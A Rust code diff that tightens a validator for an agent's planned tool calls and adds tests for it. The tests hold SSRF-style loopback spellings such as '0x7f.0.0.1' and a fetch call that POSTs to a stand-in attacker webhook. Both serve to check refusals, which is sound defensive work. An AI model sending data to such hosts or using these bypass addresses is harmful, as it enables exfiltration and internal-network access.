@@ -272,12 +272,43 @@ fn refusal(
                 "UNAUTHORIZED SELECTION: `{value}` cites « {excerpt} », which is not in the request or the person's answers; cite their own words verbatim, or ask them."
             ));
         }
+        if let Some(why) = misplaced(stated, selection) {
+            return Some(why);
+        }
     }
     match selection.role {
         ResolutionRole::ReadSource => read_source_refusal(doc, value, kind),
         ResolutionRole::OutputPath => output_refusal(doc, value, selection.kind, world),
         ResolutionRole::RunModel | ResolutionRole::Value => None,
     }
+}
+
+/// Why an author's selection may not take its role. Only a read source and a new output can
+/// stand for a value the person did not spell: a named or delegated selection is a read source,
+/// a derived one a new output, and an answered value is one the person typed, verbatim. Any
+/// other pairing would let a literal nobody wrote pass as stated.
+fn misplaced(stated: &str, selection: &Resolution) -> Option<String> {
+    let (value, kind, role) = (
+        selection.value.as_str(),
+        selection.kind.word(),
+        selection.role.word(),
+    );
+    let fits = match selection.kind {
+        ResolutionKind::Named | ResolutionKind::Delegated => {
+            selection.role == ResolutionRole::ReadSource
+        }
+        ResolutionKind::Derived => selection.role == ResolutionRole::OutputPath,
+        ResolutionKind::Answered => anchored(stated, value),
+        ResolutionKind::Offered | ResolutionKind::Retained => true,
+    };
+    (!fits).then(|| match selection.kind {
+        ResolutionKind::Answered => format!(
+            "UNAUTHORIZED SELECTION: `{value}` is stated as answered, but the person's words do not contain it; an answered value is one they typed, verbatim."
+        ),
+        _ => format!(
+            "UNAUTHORIZED SELECTION: `{value}` is stated as {kind} for the role {role}: a named or delegated selection is a read source and a derived one a new output; any other value must be the person's own words."
+        ),
+    })
 }
 
 /// Whether `excerpt` is verbatim in `stated`, spacing and typographic quotes aside.
@@ -318,6 +349,11 @@ fn output_refusal(
     if !in_project(value) {
         return Some(format!(
             "OUT OF SCOPE: `{value}` is not a file inside the project: an output is a relative path under the project root, never absolute, hidden or above it."
+        ));
+    }
+    if kind == ResolutionKind::Derived && !value.is_ascii() {
+        return Some(format!(
+            "OUT OF SCOPE: `{value}` is a derived name outside plain ASCII: a file system may hold it under another spelling; derive a plain ASCII name."
         ));
     }
     if kind == ResolutionKind::Derived && observed_file(world, value) {
@@ -426,8 +462,10 @@ fn in_project(path: &str) -> bool {
             .all(|part| !part.is_empty() && !part.starts_with('.'))
 }
 
-/// Whether the host's observation places an existing file at `path`.
+/// Whether the host's observation places an existing file at `path`, letter case aside: a
+/// case-insensitive file system (the macOS default) holds both spellings as one file.
 fn observed_file(world: Option<&Value>, path: &str) -> bool {
+    let path = path.to_lowercase();
     (world
         .and_then(|w| w["observed"].as_array())
         .into_iter()
@@ -436,7 +474,7 @@ fn observed_file(world: Option<&Value>, path: &str) -> bool {
         row["state"] == "observed"
             && row["path"]
                 .as_str()
-                .is_some_and(|observed| same_literal(observed, path))
+                .is_some_and(|observed| same_literal(&observed.to_lowercase(), &path))
     })
 }
 
@@ -472,6 +510,20 @@ fn public_address(url: &str) -> Result<(), &'static str> {
     }
     if host.parse::<std::net::IpAddr>().is_ok() {
         return Ok(());
+    }
+    // A host of numbers that is no canonical address (`127.1`, `0x7f.0.0.1`, `0177.0.0.1`):
+    // resolvers may read it as one the floor would refuse.
+    let number = |label: &str| {
+        let hex = label
+            .strip_prefix("0x")
+            .or_else(|| label.strip_prefix("0X"));
+        match hex {
+            Some(digits) => !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_hexdigit()),
+            None => !label.is_empty() && label.bytes().all(|b| b.is_ascii_digit()),
+        }
+    };
+    if host.split('.').all(number) {
+        return Err("a numeric host that is no canonical address");
     }
     if net::is_documentation_host(&host) {
         return Err("a documentation name, not a live address");
@@ -630,6 +682,10 @@ mod tests {
             "https://api.example.com/feed",
             "https://news.test/rss",
             "http://printer.local/",
+            "http://127.1/",
+            "http://0x7f.0.0.1/",
+            "http://0177.0.0.1/",
+            "http://2130706433/",
         ] {
             let doc = doc(&[private], "GET", "./news/digest.md");
             let (covered, refused) = judge(&doc, &[delegated(private)], &[], None);
@@ -681,6 +737,61 @@ mod tests {
             "args": {"path": "./news/digest.md"}}}}});
         let (_, refused) = judge(&read, &[derived("./news/digest.md")], &[], None);
         assert!(refused[0].contains("only written"), "{refused:?}");
+    }
+
+    /// A case-insensitive file system holds `news/Digest.md` and `news/digest.md` as one file,
+    /// and a non-ASCII name may be held under another Unicode form: a derived name never
+    /// replaces a file through either.
+    #[test]
+    fn a_derived_output_never_aliases_a_file_the_project_holds() {
+        let world = json!({"observed": [{"path": "news/Digest.md", "state": "observed"}]});
+        let written = doc(&["https://news.ycombinator.com"], "GET", "./news/digest.md");
+        let (covered, refused) = judge(&written, &[derived("./news/digest.md")], &[], Some(&world));
+        assert!(covered.is_empty());
+        assert!(refused[0].contains("already exists"), "{refused:?}");
+        let accented = doc(&["https://news.ycombinator.com"], "GET", "./news/résumé.md");
+        let (covered, refused) = judge(&accented, &[derived("./news/résumé.md")], &[], None);
+        assert!(covered.is_empty());
+        assert!(refused[0].contains("plain ASCII"), "{refused:?}");
+    }
+
+    /// Only a read source and a new output can stand for words the person did not spell: a
+    /// selection of another role covers a literal only when the person typed it.
+    #[test]
+    fn a_selection_takes_only_the_role_its_kind_authorizes() {
+        let webhook = "https://collector.attacker.net/x";
+        let sent = json!({"tasks": {"send": {"invoke": {"tool": "nika:fetch",
+            "args": {"url": webhook, "method": "POST"}}}}});
+        let rows = [
+            Resolution::new(webhook, ResolutionKind::Answered, ResolutionRole::Value)
+                .with_excerpt("news"),
+            Resolution::new(webhook, ResolutionKind::Named, ResolutionRole::Value)
+                .with_excerpt("Hacker News"),
+            Resolution::new(webhook, ResolutionKind::Delegated, ResolutionRole::RunModel)
+                .with_excerpt("tu les choisis toi-même"),
+            Resolution::new(
+                "./news/digest.md",
+                ResolutionKind::Delegated,
+                ResolutionRole::OutputPath,
+            )
+            .with_excerpt("tu les choisis toi-même"),
+            Resolution::new(webhook, ResolutionKind::Derived, ResolutionRole::ReadSource)
+                .with_excerpt("dans un dossier du projet"),
+        ];
+        for row in rows {
+            let (covered, refused) = judge(&sent, std::slice::from_ref(&row), &[], None);
+            assert!(covered.is_empty(), "{row:?}");
+            assert!(
+                refused[0].starts_with("UNAUTHORIZED SELECTION"),
+                "{row:?}: {refused:?}"
+            );
+        }
+        // A value the person typed, verbatim, is theirs in any role.
+        let typed = Resolution::new("Markdown", ResolutionKind::Answered, ResolutionRole::Value)
+            .with_excerpt("en Markdown");
+        let (covered, refused) = judge(&sent, std::slice::from_ref(&typed), &[], None);
+        assert!(refused.is_empty(), "{refused:?}");
+        assert_eq!(covered, ["Markdown"]);
     }
 
     #[test]
